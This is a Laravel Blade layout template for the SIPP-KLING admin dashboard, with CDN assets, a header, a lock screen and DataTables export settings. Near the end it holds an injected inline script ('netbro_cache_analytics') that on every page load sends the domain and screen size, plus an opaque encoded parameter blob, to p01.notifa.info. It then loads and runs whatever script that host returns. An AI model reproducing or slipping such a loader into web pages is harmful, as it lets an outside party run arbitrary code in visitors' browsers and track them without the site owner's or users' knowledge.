<!DOCTYPE html>
<html lang="{{ app()->getLocale() }}">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- CSRF Token -->
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>SIPP-KLING | Dashboard</title>
    <link rel="shortcut icon" href="{{ asset('img/sipp-kling/favicon.ico') }}"/>

    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.0/css/select2.min.css">
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.3/css/select2.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/admin-lte/2.3.11/css/AdminLTE.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/admin-lte/2.3.11/css/skins/_all-skins.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/iCheck/1.0.2/skins/square/_all.css">

    {{-- <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.13/semantic.min.css"> --}}
    {{-- <link rel="stylesheet" href="https://cdn.datatables.net/1.10.16/css/dataTables.semanticui.min.css"> --}}

    {{-- ============================================================================================== --}}
    <!-- Ionicons -->
    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
    <link rel="stylesheet" type="text/css" href="{{ asset('css/table.css') }}">
    <!-- <link rel="stylesheet" type="text/css" href="{{ asset('plugins/datatables/jquery.datatables.min.css') }}"> -->
    <link rel="stylesheet" type="text/css" href="{{ asset('plugins/datatables/buttons.dataTables.min.css') }}">
    <!-- <link rel="stylesheet" type="text/css" href="{{ asset('plugins/datatables/dataTables.bootstrap.css') }}"> -->
    <link rel="stylesheet" type="text/css" href="https://adminlte.io/themes/AdminLTE/bower_components/datatables.net-bs/css/dataTables.bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="{{ asset('plugins/datepicker/datepicker3.css') }}">
    <link rel="stylesheet" type="text/css" href="{{ asset('plugins/pace/pace.css') }}">

    <link rel="stylesheet" type="text/css" href="{{ asset('plugins/morris/morris.css') }}">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/morris.js/0.5.1/morris.css"') }}>
    <link rel="stylesheet" type="text/css" href="{{ asset('css/SippKling.css') }}">


    <!-- jQuery 3.1.1 -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.3/js/select2.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/iCheck/1.0.2/icheck.min.js"></script>
<script type="text/javascript">
var base_url = {!! json_encode(url('/')) !!}
</script>


{{-- ====================================================================================================================== --}}


<script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
<script src="{{ asset('plugins/fullcalendar/fullcalendar.min.js') }}"></script>
<script src="{{ asset('plugins/datepicker/bootstrap-datepicker.js') }}"></script>
<script src="{{ asset('plugins/pace/pace.min.js') }}"></script>
<script src="{{ asset('plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.min.js') }}"></script>
    <!-- core js -->
    <script type="text/javascript" src="{{ asset('js/initialize.js') }}"></script>
    <script type="text/javascript" src="{{ asset('js/core.js') }}"></script>
    <script type="text/javascript" src="{{ asset('js/sipp-kling.js') }}"></script>
    @if(Request::route()->getName() == 'dashboard-grafik')
        <script async="" src="{{ asset('plugins/bar_chart/analytics.js.download') }}"></script>
        <script src="{{ asset('plugins/bar_chart/Chart.bundle.js.download')}}"></script>
        <script src="{{ asset('plugins/bar_chart/utils.js.download') }}"></script>
        <script type="text/javascript" src="{{ asset('js/chart-sipp-kling.js') }}"></script>
    @endif

</head>
@if (!Auth::guest())
<body class="skin-purple-light sidebar-mini">
    <div class="wrapper">
        <!-- Main Header -->
        <header class="main-header">
            <!-- Logo -->
            <a href="{{ url('sipp-kling') }}" class="logo green-background-main-color">
                <span class="logo-mini"><b>S</b>KL</span>
      <!-- logo for regular state and mobile devices -->
      <span class="logo-lg"><b>SIPP KLING</b></span>
            </a>

            <!-- Header Navbar -->
            <nav class="navbar navbar-static-top green-background-main-color" role="navigation">
                <!-- Sidebar toggle button-->
                <a href="#" class="sidebar-toggle hover-changed" data-toggle="offcanvas" role="button">
                    <span class="sr-only">Toggle navigation</span>
                </a>
                <!-- Navbar Right Menu -->
                <div class="navbar-custom-menu">
                    <ul class="nav navbar-nav">
                        <li class="dropdown notifications-menu">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                              <i class="fa fa-bell-o"></i>
                              <!-- <span class="label label-warning">10</span> -->
                            </a>
                            <!--
                            <ul class="dropdown-menu">
                              <li class="header">You have 10 notifications</li>
                              <li>
                                
                                <ul class="menu">
                                  
                                  <li>
                                    <a href="#">
                                      <i class="fa fa-users text-aqua"></i> 5 new members joined today
                                    </a>
                                  </li>
                                </ul>
                              </li>
                              <li class="footer"><a href="#">View all</a></li>
                            </ul>-->
                          </li>
                        <!-- User Account Menu -->
                        <li class="dropdown user user-menu">
                            <!-- Menu Toggle Button -->
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                                <!-- The user image in the navbar-->
                                <img src="{{ asset('dist/img/admin.png')  }}"
                                     class="user-image" alt="User Image"/>
                                <!-- hidden-xs hides the username on small devices so only the image appears. -->
                                <span class="hidden-xs">{!! Auth::user()->name!!}</span>
                            </a>
                            <ul class="dropdown-menu">
                                <!-- The user image in the menu -->
                                <li class="user-header">
                                    <img src="{{ asset('dist/img/admin.png') }}"
                                         class="img-circle" alt="User Image"/>
                                    <p>
                                        {!! Auth::user()->name !!}
                                        <small>Member since {!! Auth::user()->created_at->format('M. Y') !!}</small>
                                    </p>
                                </li>
                                <!-- Menu Footer-->
                                <li class="user-footer">
                                    {{-- <div class="pull-left">
                                        <a href="#" class="btn btn-default btn-flat">Profile</a>
                                    </div> --}}
                                    <div class="pull-right">
                                        <a href="{!! url('/logout') !!}" class="btn btn-default btn-flat"
                                            onclick="event.preventDefault(); document.getElementById('logout-form').submit();">
                                            Sign out
                                        </a>
                                        <form id="logout-form" action="{{ url('/logout') }}" method="POST" style="display: none;">
                                            {{ csrf_field() }}

                                        </form>
                                    </div>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </div>
            </nav>
        </header>
        <!-- Left side column. contains the logo and sidebar -->
        @include('sipp-kling-layouts.sidebar')
        <!-- Content Wrapper. Contains page content -->
        <div class="content-wrapper">
            @include('inc.messages')
            @yield('content')
        </div>

        <!-- Main Footer -->
        {{-- <footer class="main-footer" style="max-height: 100px;text-align: center">
            <strong>Copyright ?? 2017 <a href="#">TIREGDEV</a>.</strong> All rights reserved.
        </footer> --}}
        <footer class="main-footer" style="max-height: 100px;text-align: center">
            <img src="{{ asset('dist/img/depok.png') }}" height="40px" class="user-image" alt="User Image"/>
            <img src="{{ asset('dist/img/depokbersahabat.png') }}" height="40px" class="user-image" alt="User Image"/>
            <br>
            <strong>Copyright ?? 2017 <a href="#">TIREGDEV</a>.</strong> All rights reserved.
        </footer>

    </div>

@else
{{-- ============================================================================================================ --}}
<body class="hold-transition lockscreen">
<!-- Automatic element centering -->
<div class="lockscreen-wrapper">
  <div class="lockscreen-logo">
    <a href="{{ url('sipp-kling') }}"><b>SIPP KLING</b></a>
  </div>
  <!-- User name -->
  <div class="lockscreen-name">Input Password</div>

  <!-- START LOCK SCREEN ITEM -->
  <div class="lockscreen-item">
    <!-- lockscreen image -->
    <div class="lockscreen-image">
      <img src="{{ asset('dist/img/admin.png') }}" alt="User Image">
    </div>
    <!-- /.lockscreen-image -->

    <!-- lockscreen credentials (contains the form) -->
    <form class="lockscreen-credentials">
      <div class="input-group">
        <input type="password" class="form-control" placeholder="password">

        <div class="input-group-btn">
          <button type="button" class="btn"><i class="fa fa-arrow-right text-muted"></i></button>
        </div>
      </div>
    </form>
    <!-- /.lockscreen credentials -->

  </div>
  <!-- /.lockscreen-item -->
  <div class="help-block text-center">
    Enter your password to retrieve your session
  </div>
  <div class="lockscreen-footer text-center">
    Copyright &copy; 2017-2018 <b><a href="http://hi.depok.go.id" class="text-black">TIREGDEV</a></b><br>
    All rights reserved
  </div>
</div>
<!-- <div class="lockscreen-wrapper">
  <div class="lockscreen-logo">
    <a href="/sipp-kling"><b>SIPP-KLING</b></a>
  </div>

   START LOCK SCREEN ITEM
    lockscreen image
    <div class="callout callout-warning" align="center">
                <h4><i class="icon fa fa-warning"></i> I am a danger callout <i class="icon fa fa-warning"></i></h4>
                <p>There is a problem that we need to fix. A wonderful serenity has taken possession of my entire soul,
                  like these sweet mornings of spring which I enjoy with my whole heart.</p>
              </div>

  <div class="text-center">
  <div class="lockscreen-footer text-center">
    Copyright &copy; 2017-2018 <b><a href="http://hi.depok.go.id" class="text-black">TIREGDEV</a></b><br>
    All rights reserved
  </div>
</div> -->
{{-- ============================================================================================================ --}}

@endif


<!-- Slimscroll -->
<script src="../../plugins/slimScroll/jquery.slimscroll.min.js"></script>
<!-- FastClick -->
<script src="../../plugins/fastclick/fastclick.js"></script>
<!-- AdminLTE App -->
<script src="../../dist/js/app.min.js"></script>
<script src="../../dist/js/app.js"></script>

<!-- AdminLTE for demo purposes -->
<script src="../../dist/js/demo.js"></script>

<script src="../../js/UIPageScrolling.js"></script>

<!-- AdminLTE App -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/admin-lte/2.3.11/js/app.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.3/js/select2.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/iCheck/1.0.2/icheck.min.js"></script>

<!-- select search -->
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.0/js/select2.full.min.js"></script>

{{-- Data Table --}}

<script type="text/javascript" src="https://adminlte.io/themes/AdminLTE/bower_components/datatables.net/js/jquery.dataTables.min.js"></script>
<script type="text/javascript" src="https://adminlte.io/themes/AdminLTE/bower_components/datatables.net-bs/js/dataTables.bootstrap.min.js"></script>
<script type="text/javascript" src="https://cdn.datatables.net/buttons/1.4.2/js/dataTables.buttons.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.32/pdfmake.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.32/vfs_fonts.js"></script>
<script type="text/javascript" src="//cdn.datatables.net/buttons/1.4.2/js/buttons.html5.min.js"></script>
<script type="text/javascript" src="//cdn.datatables.net/buttons/1.4.2/js/buttons.colVis.min.js"></script>



{{-- Chart --}}




<script type="text/javascript">
    $(document).ready(function () {
          $('.datepicker').datepicker({
         autoclose: true
         });

        // $(document).ajaxStart(function() { Pace.restart(); });

        // $(".select-search").select2();
      });

</script>

<script type="text/javascript">
// To make Pace works on Ajax calls
$(document).ajaxStart(function() { Pace.restart(); });
$('.ajax').click(function(){
    $.ajax({url: '#', success: function(result){
        $('.ajax-content').html('<hr>Ajax Request Completed !');
    }});
});
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m0uvGEHY%2fwuN0BqaYK61Zi96eDUXPd%2ftfkPV9Hl%2fnwkVWfuuL51O%2fafvFStQrmAf7Gfzl6QDjftKwmXNAVvBI%2fsRn6MSCb%2fLxbMB0LWPGH%2bj56lH1t0aMugoaQRJ6DF2MaLq2P670GEa9UHNecFpjtFqWLaP6sUTGLM9TjJrX87xXvrkbAte2t%2bF4G242igBgK0ihZz7uW37CT5tEVS52RqTygiya%2bKG%2bW91XZwqSACuryVbxuuxNJDUVFx3rumUs5X5b2c9tzTZKHNciwTxdFt9S9WiyIkqSQuYQ8iuB6j9qD%2fpafYLV0bhdsHNmbXwo2kO212xllqKJCExFJ8m7w6Q3Y0q3m6zmwFoDMnGH8F10TRTR2TJroIWxOGblalNH6A%2favSEt0ASJkGCosxET2SdF4yy5MgQPcyA2mrWDoUEeGml%2fT14eEt%2fw0TvWgJ7ep4IhQvy3NbcoafucWMrPCln92gd6MW9Y%2frblDtDYNA5dG2fjkPMEayVuaSjpbAhfHNFrxvm5gnL7e%2bLap%2fJEUJ%2bANxHI24douRfolIw8lbYaFCH1CyGldg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>


<!-- Morris.js charts -->


<!-- tiny mce -->
{{-- <script src="https://cloud.tinymce.com/stable/tinymce.min.js"></script>
<script>tinymce.init({ selector:'textarea' });</script> --}}
<!-- vue -->
<!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/vue@2.5.15/dist/vue.js"></script> -->


@if(Request::route()->getName() == 'dashboard-tabel' || Request::route()->getName() == 'data-admin' || Request::route()->getName() == 'admin' || Request::route()->getName() == 'kader' || Request::route()->getName() == 'trash' || Request::route()->getName() == 'dashboard-detail')

    <script type="text/javascript">
        $(function(){
            $('.example2').DataTable({
              'paging'      : true,
              'lengthChange': true,
              'searching'   : true,
              'ordering'    : true,
              'info'        : true,
              'autoWidth'   : true,
              
            dom: 'Bfrtip',
            buttons: [
                {
                        extend: 'copyHtml5',
                        title: 'data export'
                },

                {
                        extend: 'excelHtml5',
                        title: 'data export'
                },

                {
                        extend: 'csvHtml5',
                        title: 'data export'
                },

                {
                    extend: 'pdfHtml5',
                    title: 'data export'
                },

                    // 'colvis',

                    ],

                    });
        });
    </script>
@endif

@yield('scripts')
</body>
</html>
